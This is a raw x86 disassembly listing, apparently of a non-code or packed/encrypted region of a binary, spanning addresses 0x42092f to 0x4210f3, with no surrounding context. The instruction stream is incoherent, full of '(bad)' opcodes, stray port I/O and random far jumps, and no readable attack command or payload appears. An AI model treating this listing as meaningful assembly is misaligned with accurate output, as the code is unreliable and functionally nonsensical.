  42092f:	or     al,bl
  420931:	sub    DWORD PTR [ecx-0x6b],ecx
  420934:	pop    edx
  420935:	xor    al,0x92
  420937:	cmp    ebp,0x19207b0f
  42093d:	(bad)  
  42093e:	loop   0x420956
  420940:	test   eax,0x8bfa61af
  420945:	xchg   ecx,eax
  420946:	ret    0x1fc4
  420949:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42094a:	icebp  
  42094b:	push   esi
  42094c:	pop    edx
  42094d:	push   0x24468386
  420952:	es jl  0x42095f
  420955:	add    DWORD PTR [ebx],0xffffffb2
  420958:	(bad)  
  420959:	xor    al,0xf3
  42095b:	cli    
  42095c:	pop    edi
  42095d:	test   BYTE PTR [eax-0x67434694],0xea
  420964:	mov    BYTE PTR [eax+0x36],dh
  420967:	loope  0x42097e
  420969:	test   ch,ch
  42096b:	or     bl,bh
  42096d:	sar    BYTE PTR [edx+0x25c7105e],1
  420973:	mul    ecx
  420975:	je     0x4209c2
  420977:	jl     0x42093c
  420979:	add    esp,ebx
  42097b:	(bad)  
  42097c:	clc    
  42097d:	frstor [ebp+eax*2+0x6e]
  420981:	dec    ecx
  420982:	dec    edi
  420983:	pop    esi
  420984:	or     edi,edi
  420986:	jp     0x4209ef
  420988:	or     BYTE PTR [edi*8+0x6ca79589],dh
  42098f:	dec    esp
  420990:	(bad)  
  420991:	rcl    DWORD PTR [eax+0x7063a928],cl
  420997:	xchg   esi,eax
  420998:	dec    edi
  420999:	sub    eax,0xaa7017d4
  42099e:	xlat   BYTE PTR ds:[ebx]
  42099f:	loop   0x42093f
  4209a1:	xchg   ebp,eax
  4209a2:	mov    eax,ds:0x29dc11c0
  4209a7:	jo     0x420a1b
  4209a9:	adc    DWORD PTR [eax-0x3b],eax
  4209ac:	fsubr  QWORD PTR [ebx+0x3d]
  4209af:	mov    esi,0xd2665b88
  4209b4:	mov    ch,0x91
  4209b6:	ds aad 0x9c
  4209b9:	mov    ebx,0xce5fa52
  4209be:	or     dl,BYTE PTR [edi]
  4209c0:	call   0xb214b3f3
  4209c5:	pop    esp
  4209c6:	adc    al,0xea
  4209c8:	gs pop edi
  4209ca:	add    al,0xb6
  4209cc:	hlt    
  4209cd:	mov    bl,0xb
  4209cf:	outs   dx,BYTE PTR ds:[esi]
  4209d0:	imul   esi,esp,0x5c
  4209d3:	or     al,0x85
  4209d5:	call   0x5450c99d
  4209da:	pushf  
  4209db:	(bad)  
  4209dc:	(bad)  
  4209dd:	mov    cl,0x57
  4209df:	addr16 push eax
  4209e1:	cmp    DWORD PTR [edx],0xffffffac
  4209e4:	jp     0x420a1e
  4209e6:	xor    cl,ch
  4209e8:	sti    
  4209e9:	sub    edx,eax
  4209eb:	jmp    0x4209b0
  4209ed:	sbb    eax,0x84afdf1a
  4209f2:	fs jbe 0x420a1b
  4209f5:	inc    ebp
  4209f6:	mov    dh,0xb3
  4209f8:	jbe    0x4209fe
  4209fa:	mov    ebp,0xe50fef67
  4209ff:	inc    ecx
  420a00:	mov    BYTE PTR [ebp+edi*1+0x3dee3d20],ch
  420a07:	xor    al,0xed
  420a09:	mov    eax,0xc0944ae0
  420a0e:	push   edx
  420a0f:	ins    BYTE PTR es:[edi],dx
  420a10:	hlt    
  420a11:	push   ebp
  420a12:	jmp    0xa390:0xec8534d0
  420a19:	mov    eax,0x1a95a49e
  420a1e:	jecxz  0x420a99
  420a20:	dec    ebx
  420a21:	mov    edi,0xedcc19d8
  420a26:	fwait
  420a27:	imul   ebp,DWORD PTR [eax+0x22],0xd984be21
  420a2e:	ret    0xd40f
  420a31:	xchg   DWORD PTR ds:0x171f0b81,ebp
  420a37:	icebp  
  420a38:	pusha  
  420a39:	push   0x3a
  420a3b:	mov    ch,dl
  420a3d:	mov    esp,0x94ec346c
  420a42:	pop    esi
  420a43:	stos   DWORD PTR es:[edi],eax
  420a44:	xor    al,0x34
  420a46:	jbe    0x4209e5
  420a48:	push   es
  420a49:	test   BYTE PTR [esi],bl
  420a4b:	test   BYTE PTR [ecx],0xda
  420a4e:	cdq    
  420a4f:	mov    DWORD PTR [edi-0x2e1b87c9],edx
  420a55:	retf   
  420a56:	xor    eax,0x8193051b
  420a5b:	cs data16 repnz arpl sp,sp
  420a60:	mov    esi,0xa5fe1237
  420a65:	dec    eax
  420a66:	hlt    
  420a67:	aas    
  420a68:	rcr    cl,cl
  420a6a:	cmp    eax,0xc00b9c51
  420a6f:	aad    0x42
  420a71:	sub    ah,BYTE PTR [edx]
  420a73:	push   cs
  420a74:	ins    DWORD PTR es:[edi],dx
  420a75:	sahf   
  420a76:	sub    al,0x80
  420a78:	mov    esp,0xeb062242
  420a7d:	mov    edi,0xf1cc9f30
  420a82:	fisttp DWORD PTR [esi]
  420a84:	in     al,dx
  420a85:	mov    edx,0xc6b16140
  420a8a:	dec    edx
  420a8b:	jno    0x420a99
  420a8d:	mov    dl,0x9e
  420a8f:	fisttp QWORD PTR [edx-0x72a0fae6]
  420a95:	xchg   ch,bh
  420a97:	pop    edx
  420a98:	ds or  eax,0x489c8407
  420a9e:	test   DWORD PTR [ebx],0xa5a63f04
  420aa4:	push   0xffffff8b
  420aa6:	test   DWORD PTR [esi+0x36edfefb],ecx
  420aac:	cmovo  edi,DWORD PTR [ebx]
  420aaf:	sbb    ebp,DWORD PTR [edx-0x5e700853]
  420ab5:	cmp    eax,0xc560d0ae
  420aba:	xor    DWORD PTR [esi],esp
  420abc:	push   esp
  420abd:	or     ch,BYTE PTR [eax-0x5d7d7599]
  420ac3:	inc    edi
  420ac4:	lock daa 
  420ac6:	add    DWORD PTR [edi+0x3105e877],0xffffffaa
  420acd:	sbb    esi,DWORD PTR [ebp-0x68]
  420ad0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ad1:	fstp   DWORD PTR [edi+0x4b]
  420ad4:	inc    ebp
  420ad5:	stos   DWORD PTR es:[edi],eax
  420ad6:	or     al,0xcf
  420ad8:	dec    esi
  420ad9:	fwait
  420ada:	scas   eax,DWORD PTR es:[edi]
  420adb:	out    0x5c,eax
  420add:	cmp    eax,DWORD PTR [edx]
  420adf:	imul   esi,DWORD PTR ds:0x950e4887,0x36
  420ae6:	xor    eax,0x31c3e51f
  420aeb:	mov    ah,0x8
  420aed:	cmp    eax,0xdbac9e0c
  420af2:	inc    edx
  420af3:	test   eax,0xa81551be
  420af8:	dec    eax
  420af9:	sbb    cl,BYTE PTR [esi+0x13]
  420afc:	ror    BYTE PTR ds:0xada736a2,cl
  420b02:	jnp    0x420b4b
  420b04:	xchg   esp,eax
  420b05:	dec    ebp
  420b06:	sbb    eax,0x76a94adf
  420b0b:	push   ss
  420b0c:	fcmovnb st,st(3)
  420b0e:	adc    eax,0x4b8062de
  420b13:	jle    0x420b8c
  420b15:	hlt    
  420b16:	inc    edx
  420b17:	mov    esi,0xc82baeaa
  420b1c:	cmove  ecx,DWORD PTR [eax-0x1c61b94d]
  420b23:	pop    ds
  420b24:	add    eax,0x40d4b914
  420b29:	les    edi,FWORD PTR [ebx]
  420b2b:	and    ebp,DWORD PTR [ebp+0x1f]
  420b2e:	mov    cl,BYTE PTR [edx]
  420b30:	mov    ch,0x4b
  420b32:	jmp    0x7662f81e
  420b37:	aad    0x7
  420b39:	hlt    
  420b3a:	rol    BYTE PTR [eax+0x41f94f8a],0xd1
  420b41:	hlt    
  420b42:	inc    DWORD PTR ds:0x8cd6cc4b
  420b48:	add    eax,0xc491e8e9
  420b4d:	dec    ebp
  420b4e:	cmp    DWORD PTR [ecx-0x64],0xe1aa5b5e
  420b55:	add    esi,esp
  420b57:	inc    esi
  420b58:	pushf  
  420b59:	mov    ebx,0x22671853
  420b5e:	and    eax,0x5fef16d0
  420b63:	xchg   DWORD PTR [ebp+0x8711494],ebx
  420b69:	test   BYTE PTR [esi],cl
  420b6b:	mov    eax,ds:0x9b54669b
  420b70:	or     ch,bh
  420b72:	pop    eax
  420b73:	jns    0x420bb4
  420b75:	gs sti 
  420b77:	lock or ch,BYTE PTR [ebx]
  420b7a:	ss mov ch,bh
  420b7d:	repnz lods al,BYTE PTR ds:[esi]
  420b7f:	or     ah,BYTE PTR [ebp-0x451ab6ea]
  420b85:	pop    ecx
  420b86:	sti    
  420b87:	outs   dx,DWORD PTR ds:[esi]
  420b88:	xchg   ebx,eax
  420b89:	jae    0x420bea
  420b8b:	xchg   ebp,eax
  420b8c:	add    BYTE PTR [ecx],bh
  420b8e:	retf   
  420b8f:	mov    fs,WORD PTR [ebx+ebx*4-0x58a8b2d7]
  420b96:	jb     0x420bb2
  420b98:	and    eax,DWORD PTR [ecx+ebx*8]
  420b9b:	(bad)  
  420b9c:	popf   
  420b9d:	popf   
  420b9e:	ret    
  420b9f:	sbb    BYTE PTR [esi],al
  420ba1:	jmp    0x420bd6
  420ba3:	jo     0x420beb
  420ba5:	test   DWORD PTR [eax],esi
  420ba7:	xchg   ecx,eax
  420ba8:	test   ebx,edi
  420baa:	cdq    
  420bab:	xchg   edx,eax
  420bac:	jae    0x420c24
  420bae:	fild   DWORD PTR [eax+0x3f]
  420bb1:	xchg   ebp,eax
  420bb2:	jb     0x420b3a
  420bb4:	xchg   ebx,eax
  420bb5:	sti    
  420bb6:	sbb    DWORD PTR [ebp-0x72],ebx
  420bb9:	push   cs
  420bba:	lock test eax,0xeb45aa42
  420bc0:	inc    esi
  420bc1:	cdq    
  420bc2:	inc    ecx
  420bc3:	mov    ecx,0x5acde1f6
  420bc8:	call   0x5d583e35
  420bcd:	mov    ebp,0x2981650
  420bd2:	enter  0x94bf,0x36
  420bd6:	mov    edi,0x23c84711
  420bdb:	lahf   
  420bdc:	fcom   DWORD PTR [bx+si+0x663d]
  420be1:	out    0xd0,al
  420be3:	dec    edx
  420be4:	cwde   
  420be5:	xchg   ecx,eax
  420be6:	(bad)  
  420be8:	imul   esi,DWORD PTR [ebp-0xc935545],0xf44da4f7
  420bf2:	rcl    BYTE PTR [edx],0x46
  420bf5:	nop
  420bf6:	ds pusha 
  420bf8:	add    eax,0xdafb3f26
  420bfd:	or     dh,BYTE PTR [ebx-0xdda96e0]
  420c03:	jecxz  0x420bbb
  420c05:	dec    ebx
  420c06:	cmp    al,0xf2
  420c08:	call   0x1d41:0x1c292ddb
  420c0f:	pop    ebx
  420c10:	xchg   ebx,eax
  420c11:	cmp    dh,BYTE PTR [edi+0x5f5bba67]
  420c17:	jmp    0x420c21
  420c19:	xor    al,BYTE PTR [edx-0x7bb35340]
  420c1f:	fsub   QWORD PTR [ecx+0x6a20851]
  420c25:	jp     0x420c91
  420c27:	test   DWORD PTR [esi-0x78e35e20],eax
  420c2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c2e:	jge    0x420bd3
  420c30:	pop    ebx
  420c31:	and    eax,0xb15d7db8
  420c36:	push   ebx
  420c37:	imul   edx,ecx,0xfffffff0
  420c3a:	les    edx,FWORD PTR [ecx+0x6c]
  420c3d:	aam    0xa2
  420c3f:	sbb    BYTE PTR ds:0x67e36a6c,bh
  420c45:	call   0x7cb9fe36
  420c4a:	in     al,0x42
  420c4c:	in     al,dx
  420c4d:	dec    esp
  420c4e:	pusha  
  420c4f:	out    0xc5,al
  420c51:	adc    eax,0xc4cbf781
  420c56:	inc    ebx
  420c57:	call   0xfc5fc704
  420c5c:	loope  0x420c8e
  420c5e:	dec    ebx
  420c5f:	aaa    
  420c60:	lahf   
  420c61:	sar    DWORD PTR [esi-0x6f],0x9
  420c65:	xor    al,0x74
  420c67:	xor    eax,0xf582cf03
  420c6c:	(bad)  
  420c6d:	sahf   
  420c6e:	in     al,dx
  420c6f:	push   ss
  420c70:	call   0x69e24927
  420c75:	clc    
  420c76:	fdivr  st(4),st
  420c78:	inc    ebx
  420c79:	mov    edi,0xc0989713
  420c7e:	out    0xfd,eax
  420c80:	mov    cl,0x22
  420c82:	mov    al,0xe0
  420c84:	imul   ecx,DWORD PTR [ebx-0x4c],0xffffffcc
  420c88:	icebp  
  420c89:	push   esi
  420c8a:	xchg   ebp,eax
  420c8b:	rcr    DWORD PTR [esi-0x4869f555],0x7c
  420c92:	add    al,0x1f
  420c94:	xchg   esp,eax
  420c95:	out    0x9a,al
  420c97:	loope  0x420ce5
  420c99:	push   ebp
  420c9b:	(bad)  
  420c9c:	and    eax,0x9ec97d92
  420ca1:	push   edx
  420ca2:	(bad)  
  420ca3:	aas    
  420ca4:	neg    BYTE PTR [ebp-0x1e]
  420ca7:	push   eax
  420ca8:	xor    ah,bl
  420caa:	inc    ebx
  420cab:	ds mov edx,0x57377018
  420cb1:	fisttp QWORD PTR [edi+0x5c80438f]
  420cb7:	aas    
  420cb8:	out    0x90,al
  420cba:	(bad)  
  420cbb:	or     esp,DWORD PTR [edx]
  420cbd:	ds dec edi
  420cbf:	cmp    ecx,DWORD PTR [edi+0x7669e0a3]
  420cc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420cc6:	mov    ds:0x84c5afe7,eax
  420ccb:	pop    ebx
  420ccc:	xchg   ecx,eax
  420ccd:	cmp    eax,0x118723c3
  420cd2:	cs push edx
  420cd4:	jle    0x420cc5
  420cd6:	sub    DWORD PTR [ecx+0x5dfbebda],ebp
  420cdc:	push   cs
  420cdd:	sub    BYTE PTR [esp+edi*2],bl
  420ce0:	test   DWORD PTR [ebx-0x28],ebx
  420ce3:	xchg   esp,eax
  420ce4:	push   ebx
  420ce5:	xchg   edi,eax
  420ce6:	add    eax,0xc84e8e40
  420ceb:	xchg   BYTE PTR [eax-0x21],bl
  420cee:	pop    ds
  420cef:	xchg   DWORD PTR [ecx+0x31b90c5],ebp
  420cf5:	jo     0x420d26
  420cf7:	xlat   BYTE PTR ds:[ebx]
  420cf8:	pop    ebp
  420cf9:	jae    0x420d28
  420cfb:	test   BYTE PTR [eax],cl
  420cfd:	dec    ebp
  420cfe:	gs (bad) 
  420d00:	sub    DWORD PTR [ebx-0x35],ebp
  420d03:	mov    al,ds:0x2656c75a
  420d08:	sbb    eax,0x10a8e3e0
  420d0d:	xchg   ebp,eax
  420d0e:	push   edi
  420d0f:	mov    al,ds:0xe41d02c5
  420d14:	dec    ebp
  420d15:	dec    esi
  420d16:	mov    bh,0xc3
  420d18:	jne    0x420cc5
  420d1a:	sub    al,dh
  420d1c:	fld    st(7)
  420d1e:	sbb    WORD PTR [esi+0x72355e24],0xfff3
  420d26:	retf   0x39a3
  420d29:	sar    bh,0x3c
  420d2c:	test   BYTE PTR [ecx-0x610e65b0],al
  420d32:	mov    esp,0x21f0b39b
  420d37:	and    DWORD PTR [eax],0xd30bc30e
  420d3d:	daa    
  420d3e:	mov    ah,dh
  420d40:	jbe    0x420d09
  420d42:	mov    eax,0x72b195bf
  420d47:	fadd   DWORD PTR [edi+esi*4+0x704b552c]
  420d4e:	jb     0x420d74
  420d50:	(bad)  
  420d51:	out    dx,al
  420d52:	sbb    ecx,DWORD PTR [eax]
  420d54:	mov    ebp,esp
  420d56:	jmp    0xfb51:0xdab87f8a
  420d5d:	jno    0x420ce6
  420d5f:	in     eax,0xbd
  420d61:	mov    ah,0xe2
  420d63:	xlat   BYTE PTR ds:[ebx]
  420d64:	cmp    bh,BYTE PTR [ebp+ebx*2-0x55]
  420d68:	xchg   ebp,eax
  420d69:	xchg   ebp,eax
  420d6a:	fs iret 
  420d6c:	popa   
  420d6d:	test   eax,0xb3bfe1e1
  420d72:	sbb    eax,0x200e8940
  420d77:	bound  esp,QWORD PTR [esi-0xe]
  420d7a:	mov    ds:0x943aa6f4,al
  420d7f:	fadd   DWORD PTR [esi+0x25]
  420d82:	sti    
  420d83:	sub    DWORD PTR [ecx+edx*2-0x10],edi
  420d87:	leave  
  420d88:	or     DWORD PTR [ebp-0x2311517c],esp
  420d8e:	cmp    dl,bl
  420d90:	mov    DWORD PTR [ecx+0x546c2d0],esp
  420d96:	push   edx
  420d97:	sbb    al,0x9e
  420d99:	out    0x0,eax
  420d9b:	xchg   esp,eax
  420d9c:	add    al,BYTE PTR [edx+0x54]
  420d9f:	cmp    cl,0x73
  420da2:	inc    esp
  420da3:	ins    BYTE PTR es:[edi],dx
  420da4:	(bad)  
  420da5:	sub    esp,DWORD PTR [ebx]
  420da7:	mov    bl,0xcc
  420da9:	imul   esp,DWORD PTR [eax],0x42
  420dac:	or     eax,0x5097787f
  420db1:	ret    0x286e
  420db4:	(bad)  
  420db6:	in     al,0x1
  420db8:	call   0xa4098686
  420dbd:	sub    ebx,DWORD PTR [ecx]
  420dbf:	mov    ah,0xfe
  420dc1:	sbb    eax,0xae994c2
  420dc6:	xchg   ecx,eax
  420dc7:	push   esp
  420dc8:	in     eax,dx
  420dc9:	xor    DWORD PTR [edx+0x59],esp
  420dcc:	inc    ecx
  420dcd:	add    DWORD PTR ds:0x6fa0302,ebx
  420dd3:	mov    esp,0x2afdfab8
  420dd8:	xor    eax,0x1ea66d70
  420ddd:	inc    ebx
  420dde:	fnsave [ebx]
  420de0:	pop    ds
  420de1:	cs int3 
  420de3:	pusha  
  420de4:	push   cs
  420de5:	in     eax,dx
  420de6:	mov    esi,0x32573464
  420deb:	out    0x95,al
  420ded:	xor    BYTE PTR [ecx],bh
  420def:	loop   0x420dfe
  420df1:	push   0x3a
  420df3:	je     0x420d9d
  420df5:	sbb    ch,dh
  420df7:	sahf   
  420df8:	outs   dx,BYTE PTR ds:[esi]
  420df9:	ss mov edi,0xa5d3c8ee
  420dff:	inc    ebp
  420e00:	jl     0x420d9a
  420e02:	mov    bh,0x3
  420e04:	mov    edi,ds
  420e06:	stc    
  420e07:	sub    al,0xb
  420e09:	fcmovb st,st(4)
  420e0b:	adc    cl,BYTE PTR [esi]
  420e0d:	xlat   BYTE PTR ds:[ebx]
  420e0e:	or     al,0x34
  420e10:	es or  ebp,eax
  420e13:	and    cl,bl
  420e15:	dec    edx
  420e16:	in     eax,dx
  420e17:	and    eax,0xb9305d10
  420e1c:	rcr    ebp,1
  420e1e:	mov    eax,0x652d22fa
  420e23:	sbb    ebp,DWORD PTR [esi]
  420e25:	adc    BYTE PTR [edx+0x310b9f86],bl
  420e2b:	hlt    
  420e2c:	in     eax,dx
  420e2d:	inc    esp
  420e2e:	xlat   BYTE PTR ds:[ebx]
  420e2f:	pop    ss
  420e30:	cmp    al,ch
  420e32:	xor    DWORD PTR [ebx+0x60],ecx
  420e35:	xor    BYTE PTR [ebp-0x61],bh
  420e38:	retf   
  420e39:	pusha  
  420e3a:	fiadd  DWORD PTR [ebx+0x75]
  420e3d:	adc    al,0x77
  420e3f:	xor    BYTE PTR [edx+ebx*8-0x2c5b6056],al
  420e46:	cwde   
  420e47:	ins    BYTE PTR es:[edi],dx
  420e48:	loope  0x420e8c
  420e4a:	xchg   ebp,eax
  420e4b:	or     ebp,DWORD PTR [esi+0x28]
  420e4e:	fwait
  420e4f:	mov    al,ds:0xc7461d3a
  420e54:	aad    0x12
  420e56:	rcl    DWORD PTR [esi-0x12],cl
  420e59:	mov    ebx,0xd0413ed4
  420e5e:	sbb    eax,0x3f233e77
  420e63:	stos   BYTE PTR es:[edi],al
  420e64:	rcl    BYTE PTR [eax+eax*4],1
  420e67:	dec    esi
  420e68:	push   edi
  420e69:	adc    DWORD PTR [edx-0x5f6a17c0],ebp
  420e6f:	pop    esi
  420e70:	in     al,0xa9
  420e72:	push   ds
  420e73:	test   al,0x97
  420e75:	jo     0x420ed0
  420e77:	xor    BYTE PTR [ebx],dh
  420e79:	push   esp
  420e7a:	mov    cl,bh
  420e7c:	lods   eax,DWORD PTR ds:[esi]
  420e7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e7e:	lods   eax,DWORD PTR ds:[esi]
  420e7f:	mov    al,ds:0xd010a83f
  420e84:	mov    ch,0xd5
  420e86:	test   eax,esi
  420e88:	cs daa 
  420e8a:	lea    ebx,[edi+0x423b0d6d]
  420e90:	(bad)  
  420e91:	lahf   
  420e92:	xchg   DWORD PTR [edi],esp
  420e94:	sbb    bh,BYTE PTR [ebx+edi*8]
  420e97:	outs   dx,BYTE PTR ds:[esi]
  420e98:	dec    esi
  420e99:	rol    DWORD PTR [edx+edi*4+0x20b254c],0x86
  420ea1:	sti    
  420ea2:	jmp    0x420ed7
  420ea4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ea5:	xchg   ecx,eax
  420ea6:	frstor [ebx]
  420ea8:	adc    eax,0x1b703376
  420ead:	scas   eax,DWORD PTR es:[edi]
  420eae:	das    
  420eaf:	jl     0x420e8c
  420eb1:	ret    0x21d6
  420eb4:	in     al,dx
  420eb5:	cmp    cl,cl
  420eb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420eb8:	xor    eax,0xc4d41139
  420ebd:	dec    ecx
  420ebe:	dec    edi
  420ebf:	into   
  420ec0:	cld    
  420ec1:	(bad)  
  420ec2:	std    
  420ec3:	stos   BYTE PTR es:[edi],al
  420ec4:	push   esp
  420ec5:	inc    ebx
  420ec6:	pop    eax
  420ec7:	push   0x1c
  420ec9:	into   
  420eca:	ins    DWORD PTR es:[edi],dx
  420ecb:	imul   ebx,DWORD PTR [esi-0x71],0xffffffef
  420ecf:	retf   0x269e
  420ed2:	dec    ebx
  420ed3:	cmp    al,ch
  420ed5:	jmp    0x420eb9
  420ed7:	and    DWORD PTR [edx+0x1f44338],edi
  420edd:	rcr    esp,1
  420edf:	aam    0xa3
  420ee1:	pop    edi
  420ee2:	dec    esi
  420ee3:	cmp    eax,0xafc220f8
  420ee8:	sbb    al,ah
  420eea:	jbe    0x420eb2
  420eec:	rol    ch,0x59
  420eef:	ret    0x5f5d
  420ef2:	mov    dl,0xa
  420ef4:	popf   
  420ef5:	jge    0x420ed9
  420ef7:	dec    ecx
  420ef8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ef9:	gs stos DWORD PTR es:[edi],eax
  420efb:	sub    al,0x46
  420efd:	test   eax,0x36698841
  420f02:	loopne 0x420e93
  420f04:	outs   dx,DWORD PTR ds:[esi]
  420f05:	mov    esi,0x4c4a99a9
  420f0a:	adc    esp,DWORD PTR [ebx]
  420f0c:	inc    edi
  420f0d:	cmp    BYTE PTR [esi],dh
  420f0f:	push   esp
  420f10:	pop    eax
  420f11:	add    al,0x79
  420f13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f14:	jb     0x420ef7
  420f16:	add    eax,0x974e1b9
  420f1b:	mov    dl,0x72
  420f1d:	dec    ebx
  420f1e:	rcr    ah,cl
  420f20:	pop    esp
  420f21:	fisub  WORD PTR [esi-0x3dd9f36]
  420f27:	dec    esp
  420f28:	neg    dh
  420f2a:	inc    esp
  420f2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f2c:	xlat   BYTE PTR ds:[ebx]
  420f2d:	stc    
  420f2e:	into   
  420f2f:	mov    esp,0x4c2f1a8d
  420f34:	rcl    BYTE PTR [eax],cl
  420f36:	xchg   DWORD PTR [ebx+0x2e878069],esi
  420f3c:	xchg   esp,eax
  420f3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f3e:	je     0x420ece
  420f40:	rcr    BYTE PTR [edx],1
  420f42:	gs leave 
  420f44:	inc    eax
  420f45:	pushf  
  420f46:	out    0xe8,al
  420f48:	mov    ebx,?
  420f4a:	outs   dx,DWORD PTR ds:[esi]
  420f4b:	jecxz  0x420f99
  420f4d:	sbb    BYTE PTR [ebx+0x4d],dl
  420f50:	sbb    edx,DWORD PTR [ecx]
  420f52:	lea    edi,[esp+ebp*2-0x4bdee6ce]
  420f59:	adc    BYTE PTR [edi+ebx*1+0x46],bh
  420f5d:	push   esp
  420f5e:	leave  
  420f5f:	mov    ecx,0x10c1620b
  420f64:	adc    al,0xc1
  420f66:	adc    eax,0xe0f64595
  420f6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f6c:	or     al,0xa5
  420f6e:	pusha  
  420f6f:	mul    BYTE PTR ds:0x234f9c06
  420f75:	cmp    ah,cl
  420f77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f78:	inc    ebp
  420f79:	sbb    ah,cl
  420f7b:	popa   
  420f7c:	pop    eax
  420f7d:	aam    0x9d
  420f7f:	(bad)  
  420f80:	cld    
  420f81:	shr    DWORD PTR [ecx+ecx*1+0x112364fb],0xdb
  420f89:	jmp    0x420f8f
  420f8b:	cmp    dl,BYTE PTR ds:0x36e2df87
  420f91:	or     BYTE PTR [eax+0x64],dl
  420f94:	and    dl,dl
  420f96:	pushf  
  420f97:	sti    
  420f98:	bound  ebp,QWORD PTR [eax-0x69ba2404]
  420f9e:	out    dx,eax
  420f9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fa1:	stos   DWORD PTR es:[edi],eax
  420fa2:	clc    
  420fa3:	out    0x97,al
  420fa5:	or     eax,0x9d01c4f1
  420faa:	aam    0xd4
  420fac:	add    edx,edi
  420fae:	xchg   DWORD PTR [edx+0x42],edi
  420fb1:	inc    esp
  420fb2:	pop    ds
  420fb3:	cli    
  420fb4:	clc    
  420fb5:	xor    eax,0x25bf7dde
  420fba:	inc    ecx
  420fbb:	fiadd  DWORD PTR [ebx-0x476af4ab]
  420fc1:	(bad)  
  420fc2:	jg     0x420f82
  420fc4:	in     eax,dx
  420fc5:	es pop esp
  420fc7:	sbb    eax,0x14587426
  420fcc:	add    dl,BYTE PTR [edx-0x40fd1f1f]
  420fd2:	std    
  420fd3:	mov    esp,0xdf38fab5
  420fd8:	pusha  
  420fd9:	nop
  420fda:	mov    ebp,0x7350f229
  420fdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fe0:	cmp    bh,BYTE PTR [ebx+0x5c8196c8]
  420fe6:	mov    al,0x8e
  420fe8:	pop    ebx
  420fe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fea:	xlat   BYTE PTR ds:[ebx]
  420feb:	jae    0x420fed
  420fed:	xchg   ebx,eax
  420fee:	(bad)  
  420fef:	pop    ebx
  420ff0:	or     al,0x1e
  420ff2:	fwait
  420ff3:	sar    BYTE PTR [edi-0x21],0x4f
  420ff7:	push   0x31bc5268
  420ffc:	pop    ss
  420ffd:	adc    ah,BYTE PTR [edi]
  420fff:	call   0x5ba6:0x139dda38
  421006:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421007:	push   ebp
  421008:	xchg   BYTE PTR [eax],cl
  42100a:	mov    bh,0x16
  42100c:	mov    bh,0x8c
  42100e:	js     0x421021
  421010:	mov    ecx,0x57d0ba6
  421015:	adc    eax,ecx
  421017:	mov    dl,0xe8
  421019:	pop    ecx
  42101a:	jbe    0x42103d
  42101c:	or     BYTE PTR [esi],0xa9
  42101f:	daa    
  421020:	mov    cl,bh
  421022:	stc    
  421023:	mov    ebx,0xf9bac147
  421028:	je     0x421068
  42102a:	std    
  42102b:	mov    ds:0x7f9c4bec,eax
  421030:	adc    DWORD PTR [esi-0x266210c4],edx
  421036:	adc    al,0x77
  421038:	fiadd  DWORD PTR [esi+0x5658d4d1]
  42103e:	fstp   QWORD PTR [edi+0xce7fb90]
  421044:	out    dx,eax
  421045:	dec    esp
  421046:	inc    ebp
  421047:	fnstcw WORD PTR gs:[ebx+0x77]
  42104b:	out    dx,al
  42104c:	fs push esi
  42104e:	bound  ebp,QWORD PTR [esi+0xf]
  421051:	sub    al,0xea
  421053:	mov    WORD PTR [ecx+0x3298b438],es
  421059:	popa   
  42105a:	adc    ebp,ecx
  42105c:	vpsrlq xmm3,xmm3,XMMWORD PTR [ebx-0x40139bf9]
  421064:	fdiv   QWORD PTR [ebx]
  421066:	scas   al,BYTE PTR es:[edi]
  421067:	xchg   ebp,eax
  421068:	dec    ebx
  421069:	repnz push ebp
  42106b:	mov    ah,0x24
  42106d:	fldcw  WORD PTR ds:0xc1f23e82
  421073:	jnp    0x4210e0
  421075:	in     eax,dx
  421076:	test   eax,0x6e6c946a
  42107b:	js     0x421078
  42107d:	out    0xfc,al
  42107f:	adc    edi,DWORD PTR [ebp+edx*4-0x6f]
  421083:	add    DWORD PTR [edx+ecx*1-0x75],edx
  421087:	cmp    al,0x7a
  421089:	push   edx
  42108a:	(bad)  
  42108c:	test   al,0xc6
  42108e:	out    dx,eax
  42108f:	repnz push ss
  421091:	jmp    0x53c353e9
  421096:	sbb    eax,DWORD PTR [eax-0x53fa1bee]
  42109c:	dec    ecx
  42109d:	xchg   edi,eax
  42109e:	add    dh,bh
  4210a0:	jo     0x421091
  4210a2:	pusha  
  4210a3:	add    BYTE PTR [ecx+ebx*4+0x46],bl
  4210a7:	aas    
  4210a8:	adc    bh,dl
  4210aa:	aam    0x7a
  4210ac:	(bad)  
  4210ad:	push   ss
  4210ae:	push   esi
  4210af:	mov    ds,WORD PTR [ecx+eiz*8]
  4210b2:	pop    eax
  4210b3:	push   es
  4210b4:	push   esi
  4210b5:	cmovne ecx,ebx
  4210b8:	push   ss
  4210b9:	(bad)  [edx-0xf7b0c78]
  4210bf:	or     dh,ah
  4210c1:	mov    ds:0xf0ba0d33,eax
  4210c6:	retf   0xf011
  4210c9:	dec    edi
  4210ca:	jg     0x421124
  4210cc:	dec    edx
  4210cd:	mov    ecx,ecx
  4210cf:	bound  edx,QWORD PTR [ebx+0x270ecc24]
  4210d5:	jb     0x4210b9
  4210d7:	je     0x421059
  4210d9:	mov    eax,ds:0xc431be85
  4210de:	mov    ah,0xc2
  4210e0:	pusha  
  4210e1:	push   0x5e272b71
  4210e6:	jne    0x42115b
  4210e8:	xor    BYTE PTR [ecx+0x10728535],cl
  4210ee:	mov    ds:0xa93c052b,al
  4210f3:	cwde   
